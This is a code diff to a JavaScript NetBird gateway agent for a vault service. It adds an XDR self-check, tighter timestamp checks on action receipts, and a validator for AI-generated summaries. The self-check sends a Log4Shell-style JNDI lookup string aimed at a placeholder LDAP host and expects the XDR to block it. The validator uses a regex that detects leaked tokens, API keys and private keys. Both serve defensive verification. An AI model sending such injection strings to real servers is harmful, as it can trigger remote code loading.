@@ -9,6 +9,7 @@ import {readConnectionObservation} from './connection-observation.mjs';
 import config from '../../aleph.config.json' with {type:'json'};
 
 const root=new URL('../../',import.meta.url);
+const xdrProbe='/api/my/notes?id='+encodeURIComponent('${jndi:ldap://example.invalid/verification-only}');
 const safeError=error=>({code:error.code??'VAULT_UNAVAILABLE',message:({VAULT_SIGN_IN_REQUIRED:'기존 자료실에서 로그인하고 기기를 승인하세요.',DEVICE_REVOKED:'이 기기의 기존 자료실 접근이 철회됐습니다.',GRANT_REMOVED:'이 기기의 기존 자료실 이용 권한이 회수됐습니다.'})[error.code]??'NetBird와 기존 자료실 연결을 확인하세요.'});
 export function createNetBirdAgent({transport,observeNetwork,managedAccount,directRequest=fetch}){
   let authorization=null,approved=false,approvalExpires=0,epoch=0;
@@ -36,16 +37,38 @@ export function createNetBirdAgent({transport,observeNetwork,managedAccount,dire
         reason:decision==='allow'?'NetBird 게이트웨이가 접근을 허용했습니다. 자료 요청마다 기존 서버가 기기 서명과 자료 권한을 다시 검사합니다.':decision==='challenge'?'기존 자료실에서 이 브라우저의 기기 승인을 완료하세요.':decision==='deny'?'NetBird 게이트웨이가 이 기기의 자료실 접근을 차단했습니다.':'현재 원천의 상태를 확인하지 못했습니다.',checkedAt:m.checkedAt};
     },
   };
+  async function readReceipt(requestId,signal){
+    const result=await control('readCommand',{requestId},signal),receivedAt=Date.now();
+    if(!Number.isFinite(Date.parse(result.observedAt))||Math.abs(Date.parse(result.observedAt)-receivedAt)>30000)throw engineError('ACTION_RESULT_UNVERIFIED','원천의 관측 시각을 확인하지 못했습니다.');
+    // Original effect/intent remains unchanged. This observer read the source at receivedAt
+    // on the Agent clock; the durable Windows ledger retains its original timestamp.
+    return {...result,observedAt:new Date(receivedAt).toISOString()};
+  }
   const actionEngine={evidenceMode:'connected',
     readEvents:(scope,{signal}={})=>control('actionEvents',{},signal),
     authorizeAction:(command,scope,{signal}={})=>control('authorizeCommand',command,signal),
     executeAction:(command,scope,{signal}={})=>control('executeCommand',command,signal),
-    readActionResult:(command,scope,{signal}={})=>control('readCommand',{requestId:command.requestId},signal),
-    readActionReceipt:({requestId},scope,{signal}={})=>control('readCommand',{requestId},signal),
-    readOwnRevokedReceipt:({requestId},scope,{signal}={})=>control('readCommand',{requestId},signal),
+    readActionResult:(command,scope,{signal}={})=>readReceipt(command.requestId,signal),
+    readActionReceipt:({requestId},scope,{signal}={})=>readReceipt(requestId,signal),
+    readOwnRevokedReceipt:({requestId},scope,{signal}={})=>readReceipt(requestId,signal),
   };
   async function handle(req,res){
     const path=req.url.split('?')[0];
+    if(path==='/api/netbird/verify-xdr'){
+      try{
+        if(req.method!=='POST'||!authorization)throw Error();
+        const chunks=[];let size=0;for await(const c of req){size+=c.length;if(size>16000)throw Error();chunks.push(c);}
+        const input=JSON.parse(Buffer.concat(chunks).toString('utf8'));
+        if(!input||Object.keys(input).length!==1||input.headers?.authorization!==authorization)throw Error();
+        const request={method:'GET',path:xdrProbe,headers:input.headers,body:''};validateVaultRequest(request);
+        const result=await transport('/agent/vault/relay',request);
+        res.writeHead(200,{'content-type':'application/json','cache-control':'no-store'});res.end(JSON.stringify({ok:true,data:{status:result.status,code:result.data?.error,passed:result.status===403&&result.data?.error==='XDR_KNOWN_CVE',ttlSeconds:900,checkedAt:new Date().toISOString()}}));
+      }catch{res.writeHead(409,{'content-type':'application/json','cache-control':'no-store'});res.end(JSON.stringify({ok:false,error:{code:'VERIFY_UNAVAILABLE'}}));}return true;
+    }
+    if(path==='/api/netbird/windows'){
+      try{if(req.method!=='GET')throw Error();const data=await control('windows');res.writeHead(200,{'content-type':'application/json','cache-control':'no-store'});res.end(JSON.stringify({ok:true,data}));}
+      catch{res.writeHead(503,{'content-type':'application/json','cache-control':'no-store'});res.end(JSON.stringify({ok:false,error:{message:'Windows와 XDR의 현재 관측을 확인하지 못했습니다.'}}));}return true;
+    }
     if(path==='/api/netbird/verify-direct'){
       try{
         if(req.method!=='POST'||!authorization)throw Error();
@@ -122,6 +145,7 @@ export function createNetBirdAgent({transport,observeNetwork,managedAccount,dire
         captureSession({status:200,data:{access_token:input.headers.authorization.slice(7)}});
         if(result.status<300&&!['/api/auth','/api/device'].includes(query.pathname)){approved=true;approvalExpires=0;}
       }
+      if(result.status<300&&authorization===input.headers.authorization&&!['/api/auth','/api/device'].includes(query.pathname)){approved=true;}
       if(query.pathname==='/api/auth'&&query.searchParams.get('path')==='token'&&result.status<300&&typeof result.data?.access_token==='string'){
         captureSession(result);
       }
@@ -145,7 +169,9 @@ export function createNetBirdAgent({transport,observeNetwork,managedAccount,dire
         if(vaultDigest(after.context)!==contextHash||!latest||vaultDigest(latest)!==eventHash)throw Object.assign(Error(),{code:'connection_changed'});
         let d;try{d=JSON.parse(value.trim().replace(/^```(?:json)?\s*/,'').replace(/\s*```$/,''));}catch{throw Object.assign(Error(),{code:'response_unverified'});}
         const refs=rows=>Array.isArray(rows)&&rows.length>0&&new Set(rows).size===rows.length&&rows.every(id=>ids.includes(id));
-        if(!d||typeof d.summary!=='string'||d.summary.length>1500||!refs(d.evidenceIds)||d.evidenceIds.length!==ids.length||!Array.isArray(d.proposals)||d.proposals.length>2||d.proposals.some(p=>!payload.supportedActions.includes(p.action)||!refs(p.evidenceIds)||typeof p.reason!=='string')||d.requiresHumanConfirmation!==true||d.executed!==false)throw Object.assign(Error(),{code:'response_unverified'});
+        const exact=(o,keys)=>o&&typeof o==='object'&&!Array.isArray(o)&&Object.keys(o).length===keys.length&&keys.every(k=>Object.hasOwn(o,k));
+        const safe=t=>typeof t==='string'&&t.trim().length>0&&!/(?:Bearer\s+\S+|sk-(?:proj-|svcacct-)?[A-Za-z0-9_-]{16,}|-----BEGIN [A-Z ]*PRIVATE KEY-----|(?:password|api[_ -]?key|secret)\s*[:=]\s*\S+)/i.test(t);
+        if(!exact(d,['summary','evidenceIds','proposals','requiresHumanConfirmation','executed'])||!safe(d.summary)||d.summary.length>1500||!refs(d.evidenceIds)||d.evidenceIds.length!==ids.length||!Array.isArray(d.proposals)||d.proposals.length>2||d.proposals.some(p=>!exact(p,['action','evidenceIds','reason'])||!payload.supportedActions.includes(p.action)||!refs(p.evidenceIds)||!safe(p.reason)||p.reason.length>800)||d.requiresHumanConfirmation!==true||d.executed!==false)throw Object.assign(Error(),{code:'response_unverified'});
         return {eventId,eventDigest:eventHash,explanation:d};
       }};
   }
